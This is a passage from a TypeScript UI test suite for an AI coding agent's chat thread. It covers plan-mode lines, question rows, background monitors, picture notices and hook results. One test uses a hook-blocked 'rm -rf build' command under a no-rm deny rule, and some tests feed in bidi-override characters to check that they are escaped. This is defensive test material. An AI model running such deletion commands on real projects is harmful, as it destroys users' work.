        onClose: { label: CHAT.notices.close, run: onClose },
      }),
    );
    const line = container.querySelector('[data-notice-line]')!;
    expect(line.getAttribute('role')).toBe('status');
    expect(line.getAttribute('data-tone')).toBe('warning');
    expect(line.querySelector('[title]')?.getAttribute('title')).toContain('Thinking level not set.');
    act(() => byRole(container, 'button', CHAT.notices.close)!.click());
    expect(onClose).toHaveBeenCalledOnce();
    const fixed = mount(createElement(NoticeLine, { tone: 'danger', text: 'Stays.' }));
    expect(fixed.querySelector('button')).toBeNull();
  });
});

describe('ChatThread: plan mode lines', () => {
  const planned = (mode: 'plan' | 'default' | 'ask', ts: number): TranscriptEntry => ({ kind: 'plan-mode', ts, mode });

  it('"Plan mode on" and "Plan mode off" are thin lines inside their turns; a mode line never starts a turn', () => {
    const entries: TranscriptEntry[] = [
      user('Plan the cache', T0),
      planned('plan', T0 + 10),
      answer('Here is the plan.', T0 + 900),
      end('end_turn', T0 + 1_500),
      user('Build it', T0 + 2_000),
      planned('default', T0 + 2_010),
      answer('Built.', T0 + 2_900),
      end('end_turn', T0 + 3_500),
    ];
    const container = mount(
      threadOf({ mode: 'work', entries, turns: [metric(), metric()], turn: null, lastEnd: null }),
    );
    const turns = [...container.querySelectorAll('[data-turn]')];
    expect(turns).toHaveLength(2);
    const rules = (turn: Element) => [...turn.querySelectorAll('[role="separator"]')].map((r) => r.textContent);
    expect(rules(turns[0]!)).toContain(CHAT.planMode.on);
    expect(rules(turns[1]!)).toContain(CHAT.planMode.off);
    expect(container.textContent).not.toContain('plan-mode');
  });

  it('ask has its own line; a mode line held after the prompt is no step of a running answer', () => {
    const entries: TranscriptEntry[] = [user('Plan it', T0), planned('ask', T0 + 10)];
    const container = mount(
      threadOf(
        {
          mode: 'work',
          entries,
          turns: [],
          turn: { turnId: 't', phase: 'running', startedAt: T0, wait: null },
          lastEnd: null,
        },
        { model: 'qwen-a' },
      ),
    );
    expect(container.textContent).toContain(CHAT.planMode.ask);
    const line = container.querySelector('article[aria-busy="true"][data-wait-line]');
    expect(line?.getAttribute('data-wait-line')).toBe('think');
    expect(line?.textContent).toContain(CHAT.pendingThinking);
  });

  it('the "no plan mode" notice is one closable line with its fixed words', () => {
    const onClose = vi.fn();
    const container = mount(
      createElement(
        MemoryRouter,
        null,
        createElement(ConversationNotices, { notices: [{ code: 'no-plan-mode', tone: 'warning' }], onClose }),
      ),
    );
    const line = container.querySelector('[data-notice-line]')!;
    expect(line.textContent).toContain(CHAT.planMode.notice);
    expect(line.getAttribute('data-tone')).toBe('warning');
    expect(container.querySelector('[role="alert"]')).toBeNull();
    act(() => byRole(container, 'button', CHAT.notices.close)!.click());
    expect(onClose).toHaveBeenCalledWith({ code: 'no-plan-mode', tone: 'warning' });
  });
});

describe('ChatThread: the question row', () => {
  type Tool = Extract<TranscriptEntry, { kind: 'tool' }>;
  const QUESTIONS = [
    { text: 'Which database should the cart use?', multi: false, options: ['Postgres (Recommended)', 'Redis'] },
    { text: 'Which checks should run before a merge?', multi: true, options: ['Unit tests', 'Type check', 'Lint'] },
  ];
  const asked = (result: NonNullable<Tool['ask']>['result'], over: Partial<Tool> = {}): Tool => ({
    kind: 'tool',
    ts: T0 + 100,
    endTs: T0 + 200,
    id: 'toolu_ask',
    name: 'ask_user_question',
    title: 'Ask 2 questions',
    status: 'completed',
    input: '{}',
    ask: { questions: QUESTIONS, result },
    ...over,
  });
  const read = (id: string, ts: number): Tool => ({
    kind: 'tool',
    ts,
    endTs: ts + 5,
    id,
    name: 'read_file',
    title: 'src/db.ts',
    status: 'completed',
    input: '{"path":"src/db.ts"}',
    output: 'x',
  });
  const work = (entries: TranscriptEntry[], running = false): ThreadSample => ({
    mode: 'work',
    entries: running ? [user('Add a cart', T0), ...entries] : [user('Add a cart', T0), ...entries, end()],
    turns: [],
    turn: running ? { turnId: 't1', phase: 'running', startedAt: T0, wait: null } : null,
    lastEnd: null,
  });
  const row = (container: HTMLElement) => container.querySelector<HTMLElement>('[data-question-row]');
  const head = (container: HTMLElement) => row(container)!.querySelector('button[aria-expanded]')!;
  const head2 = fill(CHAT.ask.rowMany, { n: 2 });

  it('Q5: answered, closed then open: each question with its picks, then the own text', () => {
    const container = mount(
      threadOf(
        work([
          asked({
            kind: 'answered',
            answers: [
              { picks: ['Postgres (Recommended)'], other: null },
              { picks: ['Unit tests', 'Lint'], other: 'also run the e2e smoke test' },
            ],
          }),
        ]),
      ),
    );
    expect(head(container).textContent).toBe(`${head2} · ${CHAT.ask.rowAnswered}`);
    expect(head(container).getAttribute('aria-expanded')).toBe('false');
    act(() => (head(container) as HTMLButtonElement).click());
    expect(head(container).getAttribute('aria-expanded')).toBe('true');
    const pairs = [...row(container)!.querySelectorAll('dl > div')].map((div) => [
      div.querySelector('dt')!.textContent,
      div.querySelector('dd')!.textContent,
    ]);
    expect(pairs).toEqual([
      ['Which database should the cart use?', 'Postgres (Recommended)'],
      ['Which checks should run before a merge?', 'Unit tests, Lint · also run the e2e smoke test'],
    ]);
  });

  it('draws the icon and the head in the question color, the state in secondary', () => {
    const container = mount(threadOf(work([asked({ kind: 'answered', answers: [null, null] })])));
    const button = head(container);
    const icons = [...button.querySelectorAll('svg')].filter((svg) =>
      svg.getAttribute('class')?.includes('text-question'),
    );
    expect(icons).toHaveLength(1);
    const words = button.querySelector('[data-question-head]')!;
    expect(words.textContent).toBe(head2);
    expect(words.className).toContain('text-question');
    expect(words.nextElementSibling!.className).toContain('text-secondary');
    expect(words.nextElementSibling!.textContent).toBe(` · ${CHAT.ask.rowAnswered}`);
  });

  it('an answer read only as written stays so; an unanswered question says so; the own text alone', () => {
    const container = mount(threadOf(work([asked({ kind: 'answered', answers: [{ raw: 'A, B"' }, null] })])));
    act(() => (head(container) as HTMLButtonElement).click());
    expect([...row(container)!.querySelectorAll('dd')].map((dd) => dd.textContent)).toEqual([
      'A, B"',
      CHAT.ask.noAnswer,
    ]);
    rerender(threadOf(work([asked({ kind: 'answered', answers: [{ picks: [], other: 'DynamoDB' }, null] })])));
    expect(row(container)!.querySelector('dd')!.textContent).toBe('DynamoDB');
  });

  it('Q6: not answered, talk it over, plan now, failed, not finished, and a sentence it does not know', () => {
    const cases: Array<[Tool, string]> = [
      [asked({ kind: 'none' }), `${head2} · ${CHAT.ask.rowNone}`],
      [asked({ kind: 'discuss' }), `${head2} · ${CHAT.ask.rowDiscuss}`],
      [asked({ kind: 'plan-now' }), `${head2} · ${CHAT.ask.rowPlanNow}`],
      [
        asked(null, { status: 'failed', output: 'Client returned an invalid response' }),
        `${head2} · ${CHAT.ask.rowFailed}`,
      ],
      [asked(null, { status: 'in_progress', endTs: undefined }), `${head2} · ${CHAT.ask.rowUnfinished}`],
      [asked({ kind: 'text', text: 'Your questions were sent.' }), head2],
    ];
    const container = mount(threadOf(work([cases[0]![0]])));
    for (const [entry, words] of cases) {
      rerender(threadOf(work([entry])));
      expect(head(container).textContent).toBe(words);
    }
    act(() => (head(container) as HTMLButtonElement).click());
    expect(row(container)!.querySelector('[data-question-text]')!.textContent).toBe('Your questions were sent.');
    expect([...row(container)!.querySelectorAll('li')].map((li) => li.textContent)).toEqual(
      QUESTIONS.map((q) => q.text),
    );
  });

  it('live: "waiting for you" while its card is open, then nothing more until the result; one question', () => {
    const open = asked(null, {
      status: 'in_progress',
      endTs: undefined,
      ask: { questions: QUESTIONS.slice(0, 1), result: null },
    });
    const container = mount(threadOf(work([open], true), { askCalls: new Set(['toolu_ask']) }));
    expect(head(container).textContent).toBe(`${CHAT.ask.row} · ${CHAT.ask.rowWaiting}`);
    rerender(threadOf(work([open], true), { askCalls: new Set() }));
    expect(head(container).textContent).toBe(CHAT.ask.row);
  });

  it('is never folded into "Used N tools"', () => {
    const container = mount(
      threadOf(
        work([
          read('r1', T0 + 10),
          read('r2', T0 + 20),
          asked({ kind: 'none' }, { ts: T0 + 30, endTs: T0 + 40 }),
          read('r3', T0 + 50),
          read('r4', T0 + 60),
        ]),
      ),
    );
    const groups = [...container.querySelectorAll('[data-tool-group]')];
    expect(groups).toHaveLength(2);
    expect(container.textContent).not.toContain('Used 5 tools');
    expect(container.textContent).not.toContain('Used 3 tools');
    expect(row(container)!.closest('[data-tool-group]')).toBeNull();
    expect(row(container)!.closest('[data-entry-at]')).not.toBeNull();
  });

  it('every text is plain; hidden characters show as their codes', () => {
    const container = mount(
      threadOf(
        work([
          asked(null, {
            ask: {
              questions: [{ text: '<b>Which?</b>', multi: false, options: ['<i>x</i>'] }],
              result: { kind: 'answered', answers: [{ picks: ['<i>x</i>'], other: 'ok\u202E' }] },
            },
          }),
        ]),
      ),
    );
    act(() => (head(container) as HTMLButtonElement).click());
    expect(row(container)!.querySelector('b, i')).toBeNull();
    expect(row(container)!.querySelector('dt')!.textContent).toBe('<b>Which?</b>');
    expect(row(container)!.querySelector('dd')!.textContent).toBe('<i>x</i> · ok\\u{202E}');
  });

  it('a long question, answer or sentence is cut with "…"', () => {
    const long = 'q'.repeat(1_500);
    const container = mount(
      threadOf(
        work([
          asked(null, {
            ask: {
              questions: [{ text: long, multi: false, options: [] }],
              result: { kind: 'answered', answers: [{ picks: [], other: 'a'.repeat(5_000) }] },
            },
          }),
        ]),
      ),
    );
    act(() => (head(container) as HTMLButtonElement).click());
    expect(row(container)!.querySelector('dt')!.textContent).toBe(`${'q'.repeat(1_000)}…`);
    expect(row(container)!.querySelector('dd')!.textContent).toBe(`${'a'.repeat(4_000)}…`);
    rerender(
      threadOf(
        work([
          asked(null, {
            ask: {
              questions: [{ text: long, multi: false, options: [] }],
              result: { kind: 'text', text: 's'.repeat(20_000) },
            },
          }),
        ]),
      ),
    );
    expect(row(container)!.querySelector('li')!.textContent).toBe(`${'q'.repeat(1_000)}…`);
    expect(row(container)!.querySelector('[data-question-text]')!.textContent).toBe(`${'s'.repeat(16_384)}…`);
  });

  it('the notice for a question too long to show', () => {
    const container = mount(
      createElement(
        MemoryRouter,
        null,
        createElement(ConversationNotices, { notices: [{ code: 'question-too-long', tone: 'warning' }] }),
      ),
    );
    expect(container.textContent).toContain(CHAT.ask.tooLong);
  });
});

describe('ChatThread: where a background command or monitor is (T1)', () => {
  const W = CHAT.task;
  type Task = NonNullable<Extract<TranscriptEntry, { kind: 'tool' }>['task']>;
  const command = (task: Task): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 100,
    id: 'call-1',
    name: 'run_terminal_command',
    title: 'run_terminal_command',
    status: 'completed',
    input: JSON.stringify({ command: 'npm run dev', description: 'Start the dev server', is_background: true }),
    endTs: T0 + 200,
    task,
  });
  const monitor = (task: Task): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 100,
    id: 'call-2',
    name: 'monitor',
    title: 'Watch the build log',
    status: 'completed',
    input: JSON.stringify({ command: 'tail -f build.log', description: 'Watch the build log' }),
    endTs: T0 + 200,
    task,
  });
  const draw = (entry: TranscriptEntry, agentLive = true): string =>
    mount(
      threadOf(
        {
          mode: 'work',
          entries: [user('Start it'), entry, answer('Started.'), end()],
          turns: [metric()],
          turn: null,
          lastEnd: null,
        },
        { agentLive },
      ),
    ).textContent ?? '';
  const reset = (): void => {
    if (mounted === undefined) return;
    act(() => mounted!.root.unmount());
    mounted!.container.remove();
    mounted = undefined;
  };
  const words = (text: string): string[] => [W.inBackground, W.ended, W.stopped].filter((w) => text.includes(w));

  // Mutation: read `endTs` before `killed` → a stopped command reads "Ended in the background".
  it('a command reads In the background, Ended, or Stopped; one whose agent is gone ended with it', () => {
    const task: Task = { id: 'task-1', kind: 'command', label: 'Start the dev server' };
    expect(words(draw(command(task)))).toEqual([W.inBackground]);
    reset();
    expect(words(draw(command({ ...task, endTs: T0 + 9_000 })))).toEqual([W.ended]);
    reset();
    expect(words(draw(command({ ...task, endTs: T0 + 9_000, killed: true })))).toEqual([W.stopped]);
    reset();
    expect(words(draw(command(task), false))).toEqual([W.ended]);
  });

  it('a monitor row says it too; a call that started no task says none of it', () => {
    const task: Task = { id: 'task-2', kind: 'monitor', label: 'Watch the build log' };
    expect(words(draw(monitor(task)))).toEqual([W.inBackground]);
    reset();
    expect(words(draw(monitor({ ...task, endTs: T0 + 9_000, killed: true })))).toEqual([W.stopped]);
    reset();
    const plain = command(task) as Extract<TranscriptEntry, { kind: 'tool' }>;
    const { task: _task, ...none } = plain;
    expect(words(draw(none))).toEqual([]);
  });
});

describe('ChatThread: a monitor’s events (T2)', () => {
  const W = CHAT.task;
  type Task = NonNullable<Extract<TranscriptEntry, { kind: 'tool' }>['task']>;
  const TASK: Task = { id: 'mon-1', kind: 'monitor', label: 'Watch the build log' };
  const monitor = (task: Task): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 100,
    id: 'call-2',
    name: 'monitor',
    title: 'Watch the build log',
    status: 'completed',
    input: JSON.stringify({ command: 'tail -f build.log', description: 'Watch the build log' }),
    endTs: T0 + 200,
    task,
  });
  const command = (task: Task): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 100,
    id: 'call-1',
    name: 'run_terminal_command',
    title: 'run_terminal_command',
    status: 'completed',
    input: JSON.stringify({ command: 'tail -f server.log', description: 'Tail the server', is_background: true }),
    endTs: T0 + 200,
    task,
  });
  const liveOf = (events: number, texts: string[], id = TASK.id): LiveActivity => ({
    helpers: [],
    agents: [],
    tasks: [
      { id, kind: 'monitor', stopping: false, events, recent: texts.map((text, i) => ({ at: T0 + 60_000 * i, text })) },
    ],
    schedules: [],
    reports: [],
    stoppedByYou: [],
  });
  const draw = (entry: TranscriptEntry, live: LiveActivity | undefined, agentLive = true): HTMLElement =>
    mount(
      threadOf(
        {
          mode: 'work',
          entries: [user('Watch it'), entry, answer('Watching.'), end()],
          turns: [metric()],
          turn: null,
          lastEnd: null,
        },
        { agentLive, ...(live === undefined ? {} : { live }) },
      ),
    );
  const reset = (): void => {
    if (mounted === undefined) return;
    act(() => mounted!.root.unmount());
    mounted!.container.remove();
    mounted = undefined;
  };
  const eventsButton = (container: HTMLElement, n: number): HTMLElement | null =>
    byRole(container, 'button', fill(W.eventsTitle, { n }));

  // Mutation: show Events for an ended task too → stale events under "Ended in the background".
  it('a running monitor reads "In the background · 12 events" and has Events with the last five, newest first', async () => {
    const texts = ['one', 'two', 'three\r\nthree b', 'four', `bad‮`];
    const container = draw(monitor(TASK), liveOf(12, texts));
    expect(container.textContent).toContain(`${W.inBackground} · ${fill(CHAT.activity.events, { n: 12 })}`);
    const button = eventsButton(container, 12)!;
    expect(button.getAttribute('aria-expanded')).toBe('false');
    act(() => button.click());
    await waitFor(() => container.querySelector('[data-task-events]') !== null);
    const list = container.querySelector<HTMLElement>('[data-task-events]')!;
    const clock = (i: number) => formatClock(T0 + 60_000 * i, true);
    const pad = ' '.repeat(clock(0).length + 2);
    expect(list.querySelector('code, pre')?.textContent ?? list.textContent).toContain(
      [
        `${clock(4)}  bad\\u{202E}`,
        `${clock(3)}  four`,
        `${clock(2)}  three`,
        `${pad}three b`,
        `${clock(1)}  two`,
        `${clock(0)}  one`,
      ].join('\n'),
    );
    expect(list.textContent).toContain(W.eventsKept);
    expect(list.closest('[aria-live]')).toBeNull();
  });

  it('with no more events than it keeps, no "Only the last 5" line; a Work command row draws them the same way', async () => {
    const container = draw(command({ ...TASK, kind: 'command' }), liveOf(2, ['a', 'b']));
    expect(container.textContent).toContain(`${W.inBackground} · ${fill(CHAT.activity.events, { n: 2 })}`);
    act(() => eventsButton(container, 2)!.click());
    await waitFor(() => container.querySelector('[data-task-events]') !== null);
    expect(container.textContent).not.toContain(W.eventsKept);
  });

  // Mutation: drop the agentLive gate → a dead process's monitor keeps its Events.
  it('Events shows only with live events: none for an ended monitor, a gone agent, other ids or no events', () => {
    const cases: Array<[TranscriptEntry, LiveActivity | undefined, boolean, string]> = [
      [monitor({ ...TASK, endTs: T0 + 9_000 }), liveOf(3, ['x']), true, W.ended],
      [monitor(TASK), liveOf(3, ['x']), false, W.ended],
      [monitor(TASK), liveOf(3, ['x'], 'other'), true, W.inBackground],
      [monitor(TASK), liveOf(0, []), true, W.inBackground],
      [monitor(TASK), undefined, true, W.inBackground],
    ];
    for (const [entry, live, agentLive, word] of cases) {
      const container = draw(entry, live, agentLive);
      expect(container.textContent).toContain(word);
      expect(container.textContent).not.toContain(fill(CHAT.activity.events, { n: 3 }));
      expect(eventsButton(container, 3)).toBeNull();
      reset();
    }
  });
});

describe('ChatThread: a wake the host saw monitors report before (T2)', () => {
  const named = (what: string, labels: string) => fill(WAKE_ENDED.named, { what, labels });
  const monitorRow = (id: string, label: string): TranscriptEntry => ({
    kind: 'tool',
    ts: T0 + 10,
    id: `call-${id}`,
    name: 'monitor',
    title: label,
    status: 'completed',
    input: JSON.stringify({ command: 'tail -f x', description: label }),
    endTs: T0 + 20,
    task: { id, kind: 'monitor', label },
  });
  const WAKE_TS = T0 + 5_000;
  const draw = (fields: Record<string, unknown>, reports: LiveActivity['reports']): string =>
    mount(
      threadOf(
        {
          mode: 'work',
          entries: [
            user('Watch both'),
            monitorRow('m1', 'Watch the build log'),
            monitorRow('m2', 'Watch the deploy'),
            answer('Watching.'),
            end(),
            { kind: 'wake', ts: WAKE_TS, cause: 'notifications', text: '', ...fields } as TranscriptEntry,
            answer('The build failed.'),
            end(),
          ],
          turns: [metric(), metric()],
          turn: null,
          lastEnd: null,
        },
        { live: { helpers: [], agents: [], tasks: [], schedules: [], reports, stoppedByYou: [] } },
      ),
    ).textContent ?? '';
  const reset = (): void => {
    if (mounted === undefined) return;
    act(() => mounted!.root.unmount());
    mounted!.container.remove();
    mounted = undefined;
  };

  const m = (id: string, description = ''): { id: string; description: string } => ({ id, description });

  // Mutation: drop the report argument in WakeRow → the row reads "Woken by background notifications".
  it('names the monitors of the report filed under its ts; an ended task, another ts or no report keep their title', () => {
    expect(draw({}, [{ wakeTs: WAKE_TS, monitors: [m('m1')] }])).toContain(
      named(WAKE_REPORTED.one, 'Watch the build log'),
    );
    reset();
    expect(draw({}, [{ wakeTs: WAKE_TS, monitors: [m('m1'), m('m2')] }])).toContain(
      named(fill(WAKE_REPORTED.many, { n: 2 }), 'Watch the build log, Watch the deploy'),
    );
    reset();
    expect(draw({}, [{ wakeTs: WAKE_TS - 1, monitors: [m('m1')] }])).toContain('Woken by background notifications');
    reset();
    expect(draw({}, [])).toContain('Woken by background notifications');
    reset();
    const ended = { tasks: [{ id: 'c1', kind: 'command', label: 'npm test' }] };
    expect(draw(ended, [{ wakeTs: WAKE_TS, monitors: [m('m1')] }])).toContain(named(WAKE_ENDED.command, 'npm test'));
    reset();
    expect(draw({}, [{ wakeTs: WAKE_TS, monitors: [m('unknown')] }])).toContain(WAKE_REPORTED.one);
  });

  // Mutation: ignore the report's description in `wakeReportsOf` → a monitor with no row names nothing.
  it("a monitor whose row the thread does not hold is named by its event's description; a row's own words win", () => {
    expect(draw({}, [{ wakeTs: WAKE_TS, monitors: [m('gone', 'Watch the queue')] }])).toContain(
      named(WAKE_REPORTED.one, 'Watch the queue'),
    );
    reset();
    expect(draw({}, [{ wakeTs: WAKE_TS, monitors: [m('m1', 'Other words'), m('gone', 'Watch the queue')] }])).toContain(
      named(fill(WAKE_REPORTED.many, { n: 2 }), 'Watch the build log, Watch the queue'),
    );
  });
});

describe('ChatThread: a picture the agent left out or made smaller (#12)', () => {
  type Picture = Extract<TranscriptEntry, { kind: 'notice'; code: 'picture' }>;
  const NOTE = 'This request failed over its images (or was too large); 1 image(s) were left out of the retry.';
  const left = (over: Partial<Picture> = {}): Picture => ({
    kind: 'notice',
    ts: T0 + 200,
    code: 'picture',
    what: 'dropped',
    count: 1,
    notes: [NOTE],
    ...over,
  });
  const shrunk = (over: Partial<Picture> = {}): Picture => ({
    kind: 'notice',
    ts: T0 + 100,
    code: 'picture',
    what: 'shrunk',
    count: 1,
    notes: ['Downscaled Image 1: 2.1 MB (4032x3024) → 921.6 KB (2000x1500)'],
    sizes: [{ fromBytes: 2_202_010, toBytes: 943_718, from: [4032, 3024], to: [2000, 1500] }],
    ...over,
  });
  const sample = (notices: TranscriptEntry[], mode: ThreadSample['mode'] = 'chat'): ThreadSample => ({
    mode,
    entries: [user('What is in this picture?'), ...notices, answer('I could not see it.'), end()],
    turns: [metric()],
    turn: null,
    lastEnd: null,
  });
  const rows = (container: HTMLElement): HTMLElement[] => [
    ...container.querySelectorAll<HTMLElement>('[data-notice-row="picture"]'),
  ];
  const tone = (row: HTMLElement | undefined): string | null =>
    row?.querySelector('[data-tone]')?.getAttribute('data-tone') ?? null;

  it('left out: one warning row under the message, with the agent note under its headline', () => {
    const container = mount(threadOf(sample([left()])));
    const [row] = rows(container);
    expect(row!.textContent).toBe(
      `${CHAT.pictureNote.label}${CHAT.pictureNote.dropped}${formatClock(T0 + 200)}${NOTE}`,
    );
    expect(tone(row)).toBe('warning');
    const message = container.querySelector('[data-turn]')!;
    expect(message.textContent!.indexOf('What is in this picture?')).toBeLessThan(
      message.textContent!.indexOf(CHAT.pictureNote.dropped),
    );
    expect(row!.querySelector('[aria-hidden="true"] svg')).not.toBeNull();
  });

  it('made smaller: a neutral row with the sizes as facts and no note', () => {
    const container = mount(threadOf(sample([shrunk()], 'work')));
    const [row] = rows(container);
    expect(tone(row)).toBe('neutral');
    expect(row!.textContent).toBe(
      `${CHAT.pictureNote.label}${CHAT.pictureNote.shrunk}` +
        `${fill(CHAT.pictureNote.size, { from: formatBytes(2_202_010), to: formatBytes(943_718) })} · ` +
        `${fill(CHAT.pictureNote.pixels, { w: 4032, h: 3024, w2: 2000, h2: 1500 })}${formatClock(T0 + 100)}`,
    );
  });

  it('several: left out has no count (the notes say it), shrunk counts; one line per note or size; hidden characters shown', () => {
    const notes = ['Image 1 was dropped before send: bad‮ header.', 'Image 2 was dropped before send: too small.'];
    const container = mount(threadOf(sample([left({ count: 3, notes })])));
    const [row] = rows(container);
    expect(row!.textContent).toContain(CHAT.pictureNote.dropped);
    expect(row!.querySelector('p')!.textContent).toBe(
      'Image 1 was dropped before send: bad\\u{202E} header.\nImage 2 was dropped before send: too small.',
    );
    const two = shrunk({ count: 2, sizes: [shrunk().sizes![0]!, shrunk().sizes![0]!] });
    rerender(threadOf(sample([two])));
    const line = `${fill(CHAT.pictureNote.size, { from: formatBytes(2_202_010), to: formatBytes(943_718) })} · ${fill(
      CHAT.pictureNote.pixels,
      { w: 4032, h: 3024, w2: 2000, h2: 1500 },
    )}`;
    expect(rows(container)[0]!.textContent).toContain(fill(CHAT.pictureNote.shrunkMany, { n: 2 }));
    expect(rows(container)[0]!.querySelector('p')!.textContent).toBe(`${line}\n${line}`);
  });

  // Mutation: announce on the first run too → a seeded row is said.
  it('the headline is said once when a row arrives live, never for a row the thread opened with', () => {
    const onStatus = vi.fn();
    const running = (entries: TranscriptEntry[]): ThreadSample => ({
      mode: 'chat',
      entries,
      turns: [],
      turn: { turnId: 't', phase: 'running', startedAt: T0, wait: null },
      lastEnd: null,
    });
    mount(threadOf(running([user('One'), shrunk()]), { onStatus, conversationId: 'conv-1' }));
    expect(onStatus).not.toHaveBeenCalled();
    rerender(threadOf(running([user('One'), shrunk(), left()]), { onStatus, conversationId: 'conv-1' }));
    expect(onStatus.mock.calls).toEqual([[CHAT.pictureNote.dropped]]);
    rerender(
      threadOf(running([user('One'), shrunk(), left(), thinking('Next')]), { onStatus, conversationId: 'conv-1' }),
    );
    expect(onStatus.mock.calls).toEqual([[CHAT.pictureNote.dropped]]);
    // Another conversation opened in the same thread: its rows are not said.
    rerender(threadOf(running([user('Two'), left()]), { onStatus, conversationId: 'conv-2' }));
    expect(onStatus.mock.calls).toEqual([[CHAT.pictureNote.dropped]]);
  });
});

describe('ChatThread: no model answered (#16)', () => {
  const REASON = 'Model "qwen3.6-27b-q4" is not on the allowed list of this agent.';
  const blocked = (lastEnd: ThreadSample['lastEnd']): ThreadSample => ({
    mode: 'work',
    entries: [user('Fix the failing test')],
    turns: [],
    turn: null,
    lastEnd,
  });

  // Mutation: drop the `detail` of the live end → no reason line.
  it('the footer says no model answered, with Send again and the reason line under it', () => {
    const onTurnAction = vi.fn();
    const container = mount(
      threadOf(blocked({ turnId: 't1', outcome: 'no-model', model: { previous: null, next: null, reason: REASON } }), {
        onTurnAction,
      }),
    );
    expect(container.textContent).toContain(CHAT.outcomes['no-model']);
    expect(container.textContent).toContain(`${CHAT.modelAuto.none}: ${REASON}`);
    act(() => byRole(container, 'button', CHAT.sendAgain)!.click());
    expect(onTurnAction).toHaveBeenCalledWith({ kind: 'send-again', text: 'Fix the failing test' });
  });

  it('no reason line when the end has no model', () => {
    const container = mount(threadOf(blocked({ turnId: 't1', outcome: 'no-model' })));
    expect(container.textContent).toContain(CHAT.outcomes['no-model']);
    expect(container.textContent).not.toContain(CHAT.modelAuto.none);
  });

  it('a load the agent moved: the refused end names both models; one it could not use names that one', () => {
    const wanted = { previous: 'qwen3.6-27b-q4', next: 'qwen3.6-9b-q4', reason: 'Model "qwen3.6-27b-q4" is gone.' };
    const container = mount(threadOf(blocked({ turnId: 't1', outcome: 'refused', unsent: true, model: wanted })));
    expect(container.textContent).toContain(
      `${fill(CHAT.modelAuto.wanted, { previous: 'qwen3.6-27b-q4', next: 'qwen3.6-9b-q4' })} ${wanted.reason}`,
    );
    const refused = { previous: 'qwen3.6-27b-q4‮', next: null, reason: '' };
    rerender(threadOf(blocked({ turnId: 't2', outcome: 'no-model', unsent: true, model: refused })));
    expect(container.textContent).toContain(fill(CHAT.modelAuto.refused, { previous: 'qwen3.6-27b-q4\\u{202E}' }));
  });

  it('the end is said once with our sentence', () => {
    const onStatus = vi.fn();
    const running: ThreadSample = {
      ...blocked(null),
      turn: { turnId: 't1', phase: 'starting', startedAt: T0, wait: null },
    };
    mount(threadOf(running, { onStatus }));
    const ended = blocked({ turnId: 't1', outcome: 'no-model', model: { previous: null, next: null, reason: REASON } });
    rerender(threadOf(ended, { onStatus }));
    expect(onStatus.mock.calls).toEqual([[`${CHAT.outcomes['no-model']} ${CHAT.modelAuto.none}.`]]);
  });
});

describe('ChatThread: hook results (#11)', () => {
  const NOW = 1_794_411_600_000;
  type Tool = Extract<TranscriptEntry, { kind: 'tool' }>;
  type Hook = Extract<TranscriptEntry, { kind: 'notice'; code: 'hook' }>;
  const RM = '`run_terminal_command` blocked by global/no-rm: deleting build output is not allowed here';
  const runningTool: Tool = {
    kind: 'tool',
    ts: NOW - 120_000,
    id: 'r1',
    name: 'probe',
    title: 'Probe src/main.rs',
    status: 'in_progress',
  };
  const work = (entries: TranscriptEntry[], running = true): ThreadSample => ({
    mode: 'work',
    entries: [user('Fix the build', NOW - 600_000), ...entries],
    turns: [],
    turn: running ? { turnId: 't', phase: 'running', startedAt: NOW - 600_000, wait: null } : null,
    lastEnd: null,
  });
  const failedHook = (over: Partial<Hook> = {}): Hook => ({
    kind: 'notice',
    ts: NOW - 30_000,
    code: 'hook',
    event: 'pre_tool_use',
    tool: 'run_terminal_command',
    hook: 'global/lint',
    detail: 'exit status 2',
    times: 1,
    lastTs: NOW - 30_000,
    ...over,
  });
  const hookLine = (container: HTMLElement): HTMLElement | null =>
    container.querySelector<HTMLElement>('[data-hook-line] article[data-wait-line]');
  const waitLines = (container: HTMLElement): HTMLElement[] => [
    ...container.querySelectorAll<HTMLElement>('article[aria-busy="true"][data-wait-line]'),
  ];
  const timers = () =>
    vi.useFakeTimers({ now: NOW, toFake: ['Date', 'setInterval', 'clearInterval', 'setTimeout', 'clearTimeout'] });

  // Mutation: HOOK_WAIT_MS = 0 → the line shows at once.
  it('no line before the batch is 1 s old; then how many and when, with its clock, though a tool row runs; said once', () => {
    timers();
    try {
      const onStatus = vi.fn();
      const run = { event: 'pre_tool_use', tool: 'run_terminal_command', count: 2, startedAt: NOW - 400 };
      const container = mount(threadOf(work([runningTool]), { hookRun: run, onStatus }));
      expect(hookLine(container)).toBeNull();
      act(() => {
        vi.advanceTimersByTime(599);
      });
      expect(hookLine(container)).toBeNull();
      act(() => {
        vi.advanceTimersByTime(1);
      });
      const line = hookLine(container);
      expect(waitText(line)).toBe(`${fill(CHAT.hook.waitMany, { n: 2 })} · before the command`);
      expect(line?.getAttribute('data-wait-line')).toBe('hold');
      expect(line?.querySelector('[data-wait-clock]')?.textContent).toBe('0:01');
      expect(waitLines(container)).toHaveLength(1);
      expect(onStatus.mock.calls.filter(([text]) => String(text).startsWith('A hook'))).toEqual([
        [fill(CHAT.hook.status, { when: 'before the command' })],
      ]);
      rerender(threadOf(work([runningTool]), { hookRun: { ...run }, onStatus }));
      expect(onStatus.mock.calls.filter(([text]) => String(text).startsWith('A hook'))).toHaveLength(1);
      rerender(threadOf(work([runningTool]), { hookRun: null, onStatus }));
      expect(hookLine(container)).toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it('it stands in for the pending line; a retry line comes first', () => {
    timers();
    try {
      const run = { event: 'stop', count: 1, startedAt: NOW - 5_000 };
      const container = mount(threadOf(work([]), { hookRun: run }));
      expect(waitLines(container).map(waitText)).toEqual([`${CHAT.hook.wait} · ${CHAT.hook.when.stop}`]);
      const retry: RetryLive = {
        kind: 'notice',
        ts: NOW - 4_000,
        code: 'retry',
        cause: 'stalled',
        attempts: 2,
        max: 3,
      };
      rerender(threadOf(work([]), { hookRun: run, retry }));
      expect(hookLine(container)).toBeNull();
      expect(waitLines(container)).toHaveLength(1);
    } finally {
      vi.useRealTimers();
    }
  });

  it('a Work command a hook blocked: Blocked by a hook, the words as plain text, no output and no "No output"', () => {
    const tool: Tool = {
      kind: 'tool',
      ts: 1_000,
      id: 'c1',
      name: 'run_terminal_command',
      title: 'Execute',
      status: 'failed',
      input: JSON.stringify({ command: 'rm -rf build' }),
      output: 'Hook denied: no',
      blocked: `${RM} ‮x`,
    };
    const container = mount(
